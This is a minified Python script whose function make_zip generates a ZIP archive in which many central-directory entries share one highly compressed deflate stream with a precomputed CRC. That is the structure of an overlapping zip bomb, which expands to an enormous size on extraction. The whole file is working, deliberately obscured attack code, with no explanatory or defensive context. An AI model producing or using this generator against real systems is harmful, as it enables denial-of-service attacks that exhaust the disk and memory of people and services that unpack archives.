# warning: minified
from struct import pack as H,error
def D(m,v,A=0):
	for B in range(len(m)):
		if v>>B&1:A^=m[B]
	return A
def make_zip(f,num_files,compressed_size):
	O=(1<<32)-1;J,Q=num_files,[3988292384]+[1<<A for A in range(31)]+[O+1]
	Y=compressed_size-15;B=1033+Y*1032;e=b'\xed\xc0\x81\x08\0\0\0\xc0\xb0\xfbS_d\x0b'+b'\0'*Y+b'`';Z=B;C=[1<<A for A in range(33)]
	for _ in range(8):C=[D([Q,[D(Q,A)for A in[1<<A for A in range(32)]+[O+2]]][0],A)for A in C]
	M=[1<<A for A in range(33)]
	while B:
		if B&1:M=[D(M,A)for A in C]
		C=[D(C,A)for A in C];B>>=1
	N,B,E=e,B,0;a=D(M,2*O+1)&O^O
	try:E+=f.write(H('<LHHHHHLLLHH',67324752,20,0,8,0,0,a,len(N),Z,1,0)+b'0')
	except error:raise ValueError()
	E+=f.write(N);b=E
	for G in range(J):
		O=[]
		while True:
			O.insert(0,b'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'[G%36]);G=G//36-1
			if G<0:break
		E+=f.write(H('<LHHHHHHLLLHHHHHLL',33639248,20,20,0,8,0,0,a,len(N),Z,len(bytes(O)),0,0,0,0,0,0)+bytes(O))
	f.write(H('<LHHHHLLH',101010256,0,0,J,J,E-b,b,0))
